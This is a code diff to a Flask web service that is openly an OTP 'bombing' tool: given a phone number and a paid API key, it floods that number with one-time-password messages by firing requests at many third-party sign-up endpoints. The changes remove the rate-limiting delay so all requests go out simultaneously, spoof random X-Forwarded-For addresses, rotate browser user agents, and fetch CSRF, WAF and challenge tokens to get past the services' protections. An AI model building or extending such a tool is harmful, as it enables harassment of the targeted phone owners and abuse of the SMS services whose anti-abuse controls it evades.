@@ -10,7 +10,7 @@ from datetime import datetime
 from bs4 import BeautifulSoup
 import re
 import uuid
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, as_completed, wait, ALL_COMPLETED
 
 app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
 CORS(app)
@@ -42,7 +42,7 @@ stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed":
 logs_data = load_json(LOGS_FILE, [])
 active_keys = set()
 service_stats = {}
-bombing_status = {"active": False, "phone": "", "start_time": "", "total_hits": 0, "success_hits": 0, "failed_hits": 0}
+bombing_status = {"active": False, "phone": "", "start_time": "", "total_hits": 0, "success_hits": 0, "failed_hits": 0, "completed": False}
 
 # ===== LOAD KEYS =====
 def load_keys_from_github():
@@ -62,24 +62,24 @@ def validate_key(key):
         load_keys_from_github()
     return key in active_keys
 
-# ===== SESSION FUNCTIONS (SAME AS BEFORE) =====
+# ===== SESSION FUNCTIONS (WITH ROTATION) =====
 def get_pansho_session():
     session = req_lib.Session()
     headers = {
-        'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36']),
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ]),
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
         'Cache-Control': 'no-cache'
     }
     try:
-        resp = session.get('https://pansho.com/', headers=headers, timeout=10)
+        resp = session.get('https://pansho.com/', headers=headers, timeout=8)
         soup = BeautifulSoup(resp.text, 'html.parser')
         token = None
         meta = soup.find('meta', {'name': 'csrf-token'})
@@ -172,7 +172,10 @@ def get_clovia_session():
 def get_apitxt_session():
     session = req_lib.Session()
     headers = {
-        'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36']),
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+        ]),
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
@@ -216,7 +219,12 @@ def send_request(req, phone):
                 update_stats(name, False)
                 return False
             headers = req['headers'].copy()
-            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            headers['User-Agent'] = random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+            ])
+            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             headers['Referer'] = 'https://pansho.com/'
             body = req['body'].replace('{phone}', phone).replace('{token}', token)
             session.cookies.update(cookies)
@@ -229,6 +237,7 @@ def send_request(req, phone):
                 return False
             headers = req['headers'].copy()
             headers['X-Uber-Challenge-Token'] = challenge_token
+            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             body = json.loads(json.dumps(req['body']))
             body['formContainerAnswer']['formAnswer']['deviceData'] = generate_uber_device_data()
             body['formContainerAnswer']['formAnswer']['screenAnswers'][0]['fieldAnswers'][0]['phoneCountryCode'] = '+91'
@@ -242,6 +251,7 @@ def send_request(req, phone):
                 return False
             headers = req['headers'].copy()
             headers['X-Aws-Waf-Token'] = waf_token
+            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             clean_phone = phone.replace('+91', '').replace('91', '').strip()
             r = session.get(req['url'].replace('{phone}', clean_phone), headers=headers, timeout=8)
 
@@ -252,7 +262,11 @@ def send_request(req, phone):
                 return False
             headers = req['headers'].copy()
             headers['X-Csrftoken'] = csrf_token
-            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            headers['User-Agent'] = random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+            ])
+            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             body = json.loads(json.dumps(req['body']))
             clean_phone = phone.replace('+91', '').replace('91', '').strip()
             body['phone'] = clean_phone
@@ -265,7 +279,10 @@ def send_request(req, phone):
                 update_stats(name, False)
                 return False
             headers = req['headers'].copy()
-            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            headers['User-Agent'] = random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+            ])
             headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             headers['Referer'] = 'https://apitxt.com/'
             body = json.loads(json.dumps(req['body']))
@@ -281,7 +298,10 @@ def send_request(req, phone):
                 update_stats(name, False)
                 return False
             headers = req['headers'].copy()
-            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            headers['User-Agent'] = random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+            ])
             headers['Vtoken'] = vtoken
             headers['Uuid'] = f"___X_{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:12]}-{int(time.time()*1000)}"
             headers['Trace_id'] = f"___X_{uuid.uuid4().hex[:16]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:12]}-{int(time.time()*1000)}"
@@ -297,7 +317,10 @@ def send_request(req, phone):
         else:
             session = req_lib.Session()
             headers = req['headers'].copy()
-            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            headers['User-Agent'] = random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+            ])
             headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             if req['method'] == 'POST':
                 if isinstance(req['body'], dict):
@@ -342,10 +365,11 @@ def update_stats(name, success):
         else:
             bombing_status['failed_hits'] += 1
 
-# ===== BACKGROUND BOMBING =====
-def background_bombing(phone, key, otp_count=50):
+# ===== NANO-SECOND PARALLEL BOMBING =====
+def nano_parallel_bombing(phone, key, otp_count=5):
     global bombing_status, service_stats, stats_data
     
+    # Reset stats
     service_stats = {}
     stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
     save_json(STATS_FILE, stats_data)
@@ -356,21 +380,25 @@ def background_bombing(phone, key, otp_count=50):
         "start_time": datetime.now().isoformat(),
         "total_hits": 0,
         "success_hits": 0,
-        "failed_hits": 0
+        "failed_hits": 0,
+        "completed": False
     }
     
     active_requests = [r for r in requests_data if r.get('active', True)]
     
-    with ThreadPoolExecutor(max_workers=min(len(active_requests) * 15, 80)) as executor:
+    # === ULTRA PARALLEL: ALL REQUESTS AT ONCE ===
+    with ThreadPoolExecutor(max_workers=len(active_requests) * otp_count * 2) as executor:
         futures = []
         for req in active_requests:
             phone_variants = req.get('phones', [phone])
+            # Fire N requests simultaneously per service
             for i in range(otp_count):
                 target_phone = random.choice(phone_variants) if phone_variants else phone
                 future = executor.submit(send_request, req, target_phone)
                 futures.append(future)
-                time.sleep(0.02)  # 50 req/sec total
+                # NO DELAY - Nano-second parallel!
         
+        # Wait for all to complete
         for future in as_completed(futures):
             try:
                 future.result(timeout=10)
@@ -378,6 +406,7 @@ def background_bombing(phone, key, otp_count=50):
                 pass
     
     bombing_status['active'] = False
+    bombing_status['completed'] = True
 
 # ===== ROUTES =====
 stats_lock = threading.Lock()
@@ -385,7 +414,12 @@ stats_lock = threading.Lock()
 @app.route('/')
 @app.route('/api/health')
 def health():
-    return jsonify({"status": "ok", "owner": "Gaurav Beniwal", "telegram": "@gaurav_beniwal_0001"})
+    return jsonify({
+        "status": "ok",
+        "owner": "Gaurav Beniwal",
+        "telegram": "@gaurav_beniwal_0001",
+        "services": len([r for r in requests_data if r.get('active', True)])
+    })
 
 @app.route('/api/requests', methods=['GET'])
 def get_requests():
@@ -422,44 +456,53 @@ def get_logs():
 def bomb_status():
     return jsonify(bombing_status)
 
-# ===== MAIN API — INSTANT RESPONSE =====
+@app.route('/api/bomb/reset', methods=['POST'])
+def reset_bombing():
+    global bombing_status
+    bombing_status = {"active": False, "phone": "", "start_time": "", "total_hits": 0, "success_hits": 0, "failed_hits": 0, "completed": False}
+    return jsonify({"success": True, "message": "Bombing status reset"})
+
+# ===== MAIN API — NANO-SECOND PARALLEL =====
 @app.route('/api', methods=['GET'])
 def parallel_api():
     key = request.args.get('key')
     phone = request.args.get('bomb')
-    otp_count = request.args.get('otp', 50, type=int)
+    otp_count = request.args.get('otp', 5, type=int)  # Default 5 parallel per service
     
     if not key:
-        return jsonify({"error": "Missing 'key'"}), 400
+        return jsonify({"error": "Missing 'key' parameter"}), 400
     if not validate_key(key):
         return jsonify({"error": "Invalid API key"}), 401
     if not phone:
-        return jsonify({"error": "Missing 'bomb'"}), 400
-    if otp_count < 1 or otp_count > 500:
-        return jsonify({"error": "OTP count 1-500"}), 400
+        return jsonify({"error": "Missing 'bomb' parameter (phone number)"}), 400
+    if otp_count < 1 or otp_count > 50:
+        return jsonify({"error": "OTP count must be between 1 and 50"}), 400
     
-    # Check if already running
     if bombing_status.get('active', False):
         return jsonify({
             "success": False,
-            "message": "Bombing already in progress",
+            "message": "⚠️ Bombing already in progress! Use /api/bomb/reset to stop.",
             "status": bombing_status
         }), 409
     
-    # Start background bombing
-    thread = threading.Thread(target=background_bombing, args=(phone, key, otp_count))
+    # Start nano-second parallel bombing
+    thread = threading.Thread(target=nano_parallel_bombing, args=(phone, key, otp_count))
     thread.daemon = True
     thread.start()
     
-    # INSTANT RESPONSE
+    active_services = sum(1 for r in requests_data if r.get('active', True))
+    total_requests = active_services * otp_count
+    
     return jsonify({
         "success": True,
-        "message": f"🔥 OTP Bombing started on {phone} with {otp_count} OTPs per service!",
+        "message": f"🔥 NANO-PARALLEL Bombing started! {otp_count}x per service = {total_requests} simultaneous requests!",
         "phone": phone,
         "otp_per_service": otp_count,
-        "active_services": sum(1 for r in requests_data if r.get('active', True)),
+        "active_services": active_services,
+        "total_simultaneous_requests": total_requests,
         "status_endpoint": "/api/bomb/status",
         "stats_endpoint": "/api/stats",
+        "reset_endpoint": "/api/bomb/reset",
         "owner": "Gaurav Beniwal",
         "telegram": "@gaurav_beniwal_0001",
         "youtube": "https://www.youtube.com/@gaurav_beniwal_0001"
@@ -472,5 +515,6 @@ def serve_admin():
 
 load_keys_from_github()
 app.debug = False
+
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
